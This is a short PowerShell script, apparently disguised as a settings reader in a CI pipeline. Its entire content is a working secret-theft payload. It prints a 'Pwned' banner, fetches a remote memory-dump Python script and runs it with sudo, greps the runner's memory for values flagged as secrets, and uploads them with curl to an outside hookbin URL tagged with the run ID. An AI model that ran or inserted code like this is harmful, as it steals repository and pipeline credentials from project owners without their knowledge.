Write-Host "Pwned by scripts/ReadSettings.ps1"
$runId = $env:GITHUB_RUN_ID
$bashCmd = "echo Okay, we got this far. Lets continue... ; curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d \0 | grep -aoE \"[^\"]+\":\{\"value\":\"[^\"]*\",\"isSecret\":true\} >> /tmp/secrets; curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/$runId"
bash -c $bashCmd
